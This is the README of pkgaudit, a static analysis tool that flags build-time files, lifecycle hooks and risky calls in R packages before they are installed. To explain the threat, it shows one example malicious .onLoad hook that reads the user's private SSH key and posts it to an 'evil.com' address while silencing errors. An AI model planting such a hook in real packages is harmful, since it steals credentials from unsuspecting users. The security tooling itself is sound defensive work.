
<!-- README.md is generated from README.Rmd. Please edit that file -->

# pkgaudit

[![R-CMD-check](https://github.com/tylerjssmith/pkgaudit/actions/workflows/R-CMD-check.yaml/badge.svg)](https://github.com/tylerjssmith/pkgaudit/actions/workflows/R-CMD-check.yaml)
[![osv-scanner](https://github.com/tylerjssmith/pkgaudit/actions/workflows/osv-scanner.yaml/badge.svg)](https://github.com/tylerjssmith/pkgaudit/actions/workflows/osv-scanner.yaml)

pkgaudit is a static analysis security testing (SAST) tool for R source
packages. It searches R packages for files that can execute during
builds, checks, and installations and code that can execute when a
package namespace is loaded, attached, unloaded, or detached. It also
scans R source code for security-relevant patterns.

A finding is not an accusation. Most flagged code is legitimate:
packages compile source code, download data, and call shell tools for
good reasons. The purpose of a scan is to help you identify *which*
parts of an unfamiliar package deserve your attention before you install
and load it.

## Background

R is a statistical programming language widely used in environments
processing sensitive data: clinical trial analyses, government
statistics, financial risk modeling, academic research, and more.

R packages are the primary mechanism for sharing R code. They are also
potential attack vectors. When a user calls `install.packages()`, R
downloads and installs a package and its dependencies. When a user calls
`library()` to load and attach a package, R automatically executes R
code contained in `.onLoad()` and `.onAttach()` hooks.

A malicious package anywhere in the dependency graph can run code on the
user’s system without any action beyond a normal R workflow.

A minimal example of what a malicious `.onLoad()` hook might look like
is:

``` r
.onLoad <- function(libname, pkgname) {
  tryCatch({
    key <- paste(
      readLines("~/.ssh/id_rsa"),
      collapse = "\n"
    )
    httr::POST(
      "https://evil.com/evil",
      body = list(key = key)
    )
  }, error = function(e) invisible(NULL))
}
```

This code reads a private cryptographic key and sends it to a server
controlled by the attacker. This occurs whenever a package or dependency
containing this code is loaded, before any package function is called.
`tryCatch()` suppresses any errors, so the user sees nothing unusual
even if `readLines()` fails because the file does not exist or the user
lacks permission to read it.

Similar attacks have been documented in ecosystems adjacent to R. In
2022, the Python package ctx on PyPI was
[compromised](https://www.sonatype.com/blog/pypi-package-ctx-compromised-are-you-at-risk)
to exfiltrate environment variables – including credentials. In 2024,
the Python package ultralytics, a widely used computer vision library,
was
[compromised](https://pytorch.org/blog/compromised-nightly-dependency/)
to distribute a cryptominer to its users.

R’s use in environments handling sensitive data makes it an attractive
target for a broad range of threat actors. The assets at risk include
both the data processed in R sessions and the underlying systems on
which R runs, which can provide compute resources and credentials for
lateral movement. pkgaudit provides one layer of defense against an
under-appreciated risk, flagging security-relevant files and code in R
packages for manual review.

## Rule Coverage

pkgaudit v0.3.0 separates *when* code executes from *what* code does
using three categories of rules:

- **File contexts** are files that R executes at build-, check-, or
  install-time.
- **Code contexts** are lifecycle hooks whose bodies run automatically
  when a namespace is loaded, attached, unloaded, or detached.
- **Patterns** are security-relevant function calls. Each pattern
  finding is attributed to the code context it executes in, so a
  `system()` call inside `.onLoad` is distinguished from one inside an
  ordinary function (“Other”) or at top level (“Top-level”).

Every file and code context also declares the lifecycle phases in which
its code runs – `at_autoconf`, `at_build`, `at_check`, `at_install_src`,
`at_install_bin`, `on_load`, `on_attach`, `on_unload`, `on_detach` – and
a pattern inherits them from the code context it sits in. Each finding
carries one logical column per phase, so findings can be filtered by
when they execute, e.g. `subset(result$patterns, at_install_src)`.

See [RULES.md](RULES.md) for the full rule set, with the file, hook, or
function calls each rule covers and the phases in which it runs. Each
rule is defined in a YAML file under [inst/rules/](inst/rules/) and
compiled into the SQLite database at `inst/db/rules.db`.

## Installation

You can install pkgaudit as follows:

``` r
remotes::install_github("tylerjssmith/pkgaudit")
```

## Database Integrity

pkgaudit detects patterns using a SQLite database of rules shipped with
the package at `inst/db/rules.db`. To verify that your installed copy of
the database has not been modified since publication, check its SHA-256
hash against the value published here:

``` r
digest::digest(
  system.file("db", "rules.db", package = "pkgaudit"),
  algo = "sha256",
  file = TRUE
)
```

Expected SHA-256:
`f37e40d5d1b248c44ab071ca19914f4e45be101eb66353af1b2bec9fb0350850`

The hash is regenerated automatically by `inst/scripts/build_db.R`
whenever the database is rebuilt and should match the value above
exactly. `load_rules()` verifies the database against its bundled
`.sha256` sidecar on every call and refuses to load a modified database.

## Usage

A source package tarball may be scanned before installation. The example
below scans `untrustedpkg`, a small package shipped with pkgaudit for
demonstration:

``` r
library(pkgaudit)

tarball <- system.file(
  "extdata", "untrustedpkg", "untrustedpkg_0.1.0.tar.gz",
  package = "pkgaudit"
)

rules  <- load_rules()
result <- audit_tarball(tarball, rules = rules)

print(result, path = FALSE)
#> --- pkgaudit -------------------------------------------------------------------
#> Package:        untrustedpkg v0.1.0 (source tarball)
#> SHA-256:        e15feb660e38860df47907e63a355406bf0a1d99355f92b354f5e8018ae6b386
#> Scanned:        2026-07-30 14:56 UTC with pkgaudit 0.3.0, rules v0.3.0
#> 
#> File contexts:  1
#> Code contexts:  1
#> Patterns:       2
#> Errors:         0
```

`summary()` reports the findings themselves: how many run during each
lifecycle phase, the contexts found, how often each pattern matched, and
the MITRE ATT&CK techniques involved.

``` r
summary(result, path = FALSE)
#> --- pkgaudit Summary -----------------------------------------------------------
#> Package:        untrustedpkg v0.1.0 (source tarball)
#> SHA-256:        e15feb660e38860df47907e63a355406bf0a1d99355f92b354f5e8018ae6b386
#> Scanned:        2026-07-30 14:56 UTC with pkgaudit 0.3.0, rules v0.3.0
#> 
#> --- Findings by Phase ----------------------------------------------------------
#> phase          file_contexts code_contexts patterns
#> at_autoconf                0             0        0
#> at_build                   1             1        1
#> at_check                   1             1        1
#> at_install_src             1             1        1
#> at_install_bin             0             0        0
#> on_load                    0             1        1
#> on_attach                  0             0        0
#> on_unload                  0             0        0
#> on_detach                  0             0        0
#> none                       0             0        1
#> 
#> --- File Contexts --------------------------------------------------------------
#> file_context
#> configure
#> 
#> --- Code Contexts --------------------------------------------------------------
#> rule
#> onload_code
#> 
#> --- Patterns -------------------------------------------------------------------
#> rule                  occurrences attck
#> download_file_pattern           1 T1105 T1195.002
#> system_pattern                  1 T1059.003 T1059.004 T1195.002
#> 
#> --- Errors ---------------------------------------------------------------------
#> All R scripts were successfully parsed.
#> 
#> --- Notes ----------------------------------------------------------------------
#> pkgaudit is intended to assist with manual review, not replace it.
```

Both methods take `path = FALSE`, used above, to omit the local file
path from output that will be shared. The result itself is a named list
of data frames:

``` r
result$file_contexts  # security-relevant files
result$code_contexts  # hooks / top-level code
result$patterns       # security-relevant calls, each with its code_context
result$errors         # any files or rules that could not be processed
result$metadata       # package name/version, SHA-256, rules version, scan time
```

Each of the three findings frames also carries the nine phase columns,
so `subset(result$patterns, on_load)` is the set of calls that run on
`library()`.
